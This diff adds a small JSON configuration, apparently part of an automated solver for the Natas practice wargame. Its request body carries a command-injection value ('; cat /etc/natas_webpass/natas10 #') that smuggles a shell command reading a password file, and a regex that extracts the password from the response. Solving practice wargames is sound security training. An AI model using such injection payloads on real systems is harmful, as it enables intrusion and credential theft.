@@ -1,0 +1,10 @@
+{
+    "hint":"inject command",
+    "findedByRegexInContent":"[a-zA-Z0-9]{32}\\s",
+    "method":"POST",
+    "isFormData": true,
+    "body":{
+        "needle": "; cat /etc/natas_webpass/natas10 #",
+        "submit":"1"
+    }
+}
